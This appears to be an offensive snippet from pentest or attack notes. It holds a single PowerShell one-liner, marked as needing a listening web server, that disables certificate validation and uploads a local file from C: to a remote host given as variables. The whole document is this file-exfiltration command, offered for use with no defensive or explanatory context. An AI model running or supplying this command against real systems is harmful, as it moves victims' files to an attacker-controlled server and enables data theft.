#requires listening webserver

powershell.exe -noprofile -noninteractive -command "[System.Net.ServicePointManager]::ServiceCertificateValidationCallBack = {$true}; $server="""http://$ip/$folder""";$filepath="""C:\$downloaded""";$http = new-object System.Net.WebClient; $response = $http.UploadFile($server,$filepath);"
